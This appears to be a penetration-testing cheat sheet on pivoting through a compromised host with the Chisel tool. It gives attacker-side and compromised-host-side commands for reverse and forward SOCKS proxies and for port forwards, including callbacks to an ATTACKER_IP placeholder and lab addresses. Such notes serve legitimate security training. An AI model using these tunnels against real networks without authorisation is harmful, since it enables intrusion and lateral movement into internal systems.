
**Chisel** is a tunneling tool written in Go that can create **SOCKS proxies and port forwards** without requiring SSH access on the compromised host.

It provides static binaries for Linux and Windows.

## Setup
You need the Chisel binary on both machines.

Transfer example:
```bash
scp -i KEY chisel user@TARGET:/tmp/chisel
```

Check help:
```bash
./chisel server --help
./chisel client --help
```

---

# Chisel SOCKS Proxy = Dynamic Pivot

```text
SOCKS = one tunnel → many possible targets
```
## Reverse SOCKS Proxy
The compromised host connects back to the attacker.

**Attacker:**
```bash
./chisel server -p LISTEN_PORT --reverse &
```

**Compromised Host:**
```bash
./chisel client ATTACKER_IP:LISTEN_PORT R:socks &
```

### Example

**Attacker:**
```bash
./chisel server -p 1337 --reverse &
```

**Compromised Host:**
```bash
./chisel client 172.16.0.20:1337 R:socks &
```

Chisel creates the SOCKS5 proxy on:
```text
127.0.0.1:1080
```

Configure Proxychains:
```text
socks5 127.0.0.1 1080
```

Now you can run:
```
proxychains curl http://172.16.0.10
```

or:
```
proxychains ssh user@172.16.0.10
```
### Key Point
`R:` means the remote/forwarding endpoint is created on the **client side** (the compromised host).

## Forward SOCKS Proxy
The attacker connects **to the compromised host**.
### Syntax

**Compromised Host:**
```bash
./chisel server -p LISTEN_PORT --socks5
```

**Attacker:**
```bash
./chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks
```

### Example

**Compromised Host:**
```bash
./chisel server -p 8080 --socks5
```

**Attacker:**
```bash
./chisel client 172.16.0.5:8080 1337:socks
```

SOCKS5 proxy:
```text
127.0.0.1:1337
```


Now you can run:
```
proxychains curl http://172.16.0.10
```

or:
```
proxychains ssh user@172.16.0.10
```

---
# Chisel Port Forwarding = Static Pivot

## Remote Port Forward
The compromised host connects back to the attacker and creates a port on the attacker.
 

**Attacker:**
```bash
./chisel server -p LISTEN_PORT --reverse &
```

**Compromised Host:**
```bash
./chisel client ATTACKER_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT &
```

### Example

**Attacker:**
```bash
./chisel server -p 1337 --reverse &
```

**Compromised Host:**
```bash
./chisel client 172.16.0.20:1337 R:2222:172.16.0.10:22 &
```

Traffic:
```text
Attacker:2222
      ↓
Compromised Host
      ↓
172.16.0.10:22
```

Access the internal SSH service:
```bash
ssh user@127.0.0.1 -p 2222
```

### Important
Don't confuse:
- `LISTEN_PORT` → Chisel server connection port
- `LOCAL_PORT` → port opened for accessing the internal service

## Local Port Forward
The attacker connects to a Chisel server on the compromised host.

**Compromised Host:**
```bash
./chisel server -p LISTEN_PORT
```

**Attacker:**
```bash
./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT
```

### Example

**Compromised Host:**
```bash
./chisel server -p 8000
```

**Attacker:**
```bash
./chisel client 172.16.0.5:8000 2222:172.16.0.10:22
```

Then:
```bash
ssh user@127.0.0.1 -p 2222
```

Traffic:
```text
Attacker:2222
      ↓
Chisel on 172.16.0.5
      ↓
172.16.0.10:22
```

---
## Chisel Cleanup
```bash
jobs
kill %NUMBER
```

On Windows, use the `.exe` binary:
```text
chisel.exe
```

```text
                 Chisel
                   │
        ┌──────────┴──────────┐
        │                     │
      SOCKS              Port Forward
        │                     │
     Dynamic                 Static
        │                     │
   Many targets            One target
```